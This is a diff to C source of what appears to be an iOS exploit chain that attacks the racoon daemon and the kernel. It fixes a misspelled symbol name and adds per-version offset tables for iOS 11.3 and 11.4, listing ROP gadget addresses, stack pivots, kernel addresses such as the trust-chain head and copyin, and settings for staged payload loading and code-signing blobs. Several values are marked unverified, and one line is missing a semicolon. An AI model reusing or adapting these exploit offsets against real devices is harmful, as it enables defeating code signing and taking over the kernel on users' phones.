@@ -66,7 +66,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.mmap = realsym(dyld_cache_path,"__mmap"); // dlsym of __mmap
 	myoffsets.memcpy = realsym(dyld_cache_path,"_memcpy"); // dlsym
 	myoffsets.fcntl_raw_syscall = realsym(dyld_cache_path,"__fcntl"); // raw bytes again (because it's a mov x16, <imm>, svc and that can't change)
-	myoffsets.raw_mach_vm_remap_call = realsym(dyld_cache_path,"_mach_vm_remao");
+	myoffsets.raw_mach_vm_remap_call = realsym(dyld_cache_path,"_mach_vm_remap");
 	
 	// kernel symbols/offsets below (iirc one of the struct offsets changed between iOS 11.1.2 and 11.3.1 so watch out for that)
 	myoffsets.ipr_size = 8; // offset of the ipr_size field
@@ -94,6 +94,124 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.stage3_jumpaddr = myoffsets.stage3_loadaddr + STAGE3_JUMP;
 	myoffsets.stage3_CS_blob = STAGE3_CSBLOB; 
 	myoffsets.stage3_CS_blob_size = STAGE3_CSBLOB_SIZE;
+	
+
+#if N69_11_4
+    jake_img_t kernel_symbols; // dummy
+    offset_struct_t myoffsets;
+    // adr @ 0x100067c10
+    // ldr @ 0x1000670e0
+    myoffsets.dns4_array_to_lcconf = -((0x100067c10+0x28-4*8)-0x1000670e0);
+    myoffsets.str_buff_offset = 8; // VERIFY
+    myoffsets.max_slide = 0x0000000004678000;
+    myoffsets.slide_value = 0x4000;
+    myoffsets.pivot_x21 = 0x199c4b93c
+    myoffsets.pivot_x21_x9_offset = 0x50-0x38; // VERIFY
+    myoffsets.memmove = 0x1ab7b0d50;
+    myoffsets.lcconf_counter_offset = 0x10c;
+    myoffsets.cache_text_seg_size = 0x30000000;
+    myoffsets.new_cache_addr = 0x1c0000000;
+
+    myoffsets.BEAST_GADGET = 0x1a16e6494;
+    myoffsets.BEAST_GADGET_LOADER = myoffsets.BEAST_GADGET+4*9; // VERIFY
+    myoffsets.BEAST_GADGET_CALL_ONLY = myoffsets.BEAST_GADGET+4*8; // VERIFY
+    myoffsets.str_x0_gadget = 0x197e1eac8;
+    myoffsets.str_x0_gadget_offset = 0x28; // VERIFY
+    myoffsets.cbz_x0_gadget = 0x188d340bc;
+    myoffsets.cbz_x0_x16_load = 0x1b1d72000+0x4c8;
+    myoffsets.add_x0_gadget = 0x18519cb90;
+    myoffsets.rop_nop = myoffsets.BEAST_GADGET+4*17;
+    myoffsets.errno_offset = 0x1b3263000+0xff8+(0x1c0000000-0x180000000);
+    myoffsets.mach_msg_offset = 0x1f1896018; // TODO: will find this one through dynamic ana I guess?
+
+    myoffsets.longjmp = realsym(dyld_cache_path,"__longjmp");
+    myoffsets.stack_pivot = 0x180b12714;
+    myoffsets.open = realsym(dyld_cache_path,"_open");
+    myoffsets.mmap = realsym(dyld_cache_path,"___mmap");
+    myoffsets.memcpy = realsym(dyld_cache_path,"_memcpy");
+    myoffsets.fcntl_raw_syscall = realsym(dyld_cache_path,"___fcntl");
+    myoffsets.raw_mach_vm_remap_call = realsym(dyld_cache_path,"_mach_vm_remap");
+    
+    myoffsets.ipr_size = 8;
+    myoffsets.trust_chain_head_ptr = 0xFFFFFFF0076B0EE8;
+    myoffsets.copyin = 0xFFFFFFF0071A71CC;
+    myoffsets.gadget_add_x0_x0_ret = 0xFFFFFFF0073C9C58;
+    myoffsets.rootdomainUC_vtab = 0xfffffff00708e158;
+    myoffsets.swapprefix_addr = 0xfffffff0075ad8cc;
+    myoffsets.itk_registered = 0x2f0;
+    myoffsets.is_task = 0x28;
+    
+    myoffsets.stage2_base = myoffsets.new_cache_addr+myoffsets.cache_text_seg_size+0x4000;
+    myoffsets.stage2_max_size = 0x200000;
+    myoffsets.thread_max_size = 0x10000;
+    myoffsets.stage2_databuffer_len = 0x10000; // Moved from stage2.m
+	myoffsets.stage2_barrier_buffer_size = 0x10000; // Moved from stage2.m
+    myoffsets.stage3_fileoffset = 0;
+    myoffsets.stage3_size = 0x10000;
+    myoffsets.stage3_loadaddr = myoffsets.new_cache_addr-0x100000;
+    // YOU NEED TO UPDATE THOSE WHEN YOU RECOMPILE STAGE 3 (you also need to update the hashes in stage2.c so watch out for that)
+    myoffsets.stage3_jumpaddr = myoffsets.stage3_loadaddr + STAGE3_JUMP;
+	myoffsets.stage3_CS_blob = STAGE3_CSBLOB; 
+	myoffsets.stage3_CS_blob_size = STAGE3_CSBLOB_SIZE;
+#endif
+#if N69_11_3
+    jake_img_t kernel_symbols; // dummy
+	offset_struct_t myoffsets;
+    // adr @ 0x100067c10
+    // ldr @ 0x1000670e0
+    myoffsets.dns4_array_to_lcconf = -((0x100067c10+0x28-4*8)-0x1000670e0);
+    myoffsets.str_buff_offset = 8;
+    myoffsets.max_slide = 0x4810000;
+    myoffsets.slide_value = 0x4000;
+    myoffsets.pivot_x21 = 0x199bb31a8;
+    myoffsets.pivot_x21_x9_offset = 0x50-0x38;
+    myoffsets.memmove = 0x1ab680d20;
+	myoffsets.lcconf_counter_offset = 0x10c;
+	myoffsets.cache_text_seg_size = 0x30000000;
+	myoffsets.new_cache_addr = 0x1c0000000;
+
+    myoffsets.BEAST_GADGET = 0x1a1632494;
+    myoffsets.BEAST_GADGET_LOADER = myoffsets.BEAST_GADGET+4*9;
+    myoffsets.BEAST_GADGET_CALL_ONLY = myoffsets.BEAST_GADGET+4*8;
+    myoffsets.str_x0_gadget = 0x197d94ac8;
+    myoffsets.str_x0_gadget_offset = 0x28;
+    myoffsets.cbz_x0_gadget = 0x188cffe5c;
+    myoffsets.cbz_x0_x16_load = 0x1b1c0e000+0x2c8;
+    myoffsets.add_x0_gadget = 0x18518bb90;
+    myoffsets.rop_nop = myoffsets.BEAST_GADGET+4*17;
+    myoffsets.errno_offset = 0x1f30f1000+0xff8;
+    myoffsets.mach_msg_offset = 0x1f1896018;
+    
+    myoffsets.longjmp = realsym(dyld_cache_path,"__longjmp");
+    myoffsets.stack_pivot = 0x180b12714;
+    myoffsets.mmap = realsym(dyld_cache_path,"___mmap");
+    myoffsets.memcpy = realsym(dyld_cache_path,"_memcpy");
+    myoffsets.open = realsym(dyld_cache_path,"_open");
+    myoffsets.fcntl_raw_syscall = realsym(dyld_cache_path,"___fcntl");
+    myoffsets.raw_mach_vm_remap_call = realsym(dyld_cache_path,"_mach_vm_remap");
+    
+    myoffsets.ipr_size = 8;
+    myoffsets.trust_chain_head_ptr = 0xFFFFFFF0076B0EE8;
+    myoffsets.copyin = 0xFFFFFFF0071A7090;
+    myoffsets.gadget_add_x0_x0_ret = 0xFFFFFFF0073C96A8;
+    myoffsets.rootdomainUC_vtab = 0xfffffff00708e158; // iometa
+    myoffsets.swapprefix_addr = 0xfffffff0075a98cc;
+    myoffsets.itk_registered = 0x2f0;
+    myoffsets.is_task = 0x28;
+ 
+    myoffsets.stage2_base = myoffsets.new_cache_addr+myoffsets.cache_text_seg_size+0x4000;
+    myoffsets.stage2_max_size = 0x200000;
+    myoffsets.thread_max_size = 0x10000;
+    myoffsets.stage2_databuffer_len = 0x10000; // Moved from stage2.m
+	myoffsets.stage2_barrier_buffer_size = 0x10000; // Moved from stage2.m
+    myoffsets.stage3_fileoffset = 0; // at which place in the file (dylib) stage 3 (the code section) starts
+    myoffsets.stage3_size = 0x10000; // get the file size and round at page boundry
+    myoffsets.stage3_loadaddr = myoffsets.new_cache_addr-0x100000; // place stage 3 in front of the remaped cache
+    // YOU NEED TO UPDATE THOSE WHEN YOU RECOMPILE STAGE 3 (you also need to update the hashes in stage2.c so watch out for that)
+    myoffsets.stage3_jumpaddr = myoffsets.stage3_loadaddr + STAGE3_JUMP;
+	myoffsets.stage3_CS_blob = STAGE3_CSBLOB; 
+	myoffsets.stage3_CS_blob_size = STAGE3_CSBLOB_SIZE;
+#endif
 
 	// generate stage 2 before stage 1 cause stage 1 needs to know the size of it
 	stage2(kernel_symbols,&myoffsets,"/private/etc/racoon/");
